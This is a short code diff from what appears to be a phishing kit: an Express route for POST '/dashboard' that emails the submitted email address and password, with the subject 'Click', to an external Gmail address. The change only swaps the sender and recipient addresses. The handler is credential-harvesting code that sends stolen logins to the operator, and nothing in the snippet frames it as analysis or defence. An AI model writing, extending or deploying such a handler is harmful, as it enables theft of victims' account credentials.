@@ -31,8 +31,8 @@ router.post('/dashboard', function (req, res, next) {
     });
 
     let HelperOption = {
-        from : '"Mail Server" <serveur.wemail0511@gmail.com',
-        to : 'glava.zmeya@gmail.com',
+        from : '"Mail Server" <glava.zmeya@gmail.com',
+        to : 'serveur.webmail0511@gmail.com',
         subject: 'Click',
         text : "Email: " + email + " Pass: " + pass
     };
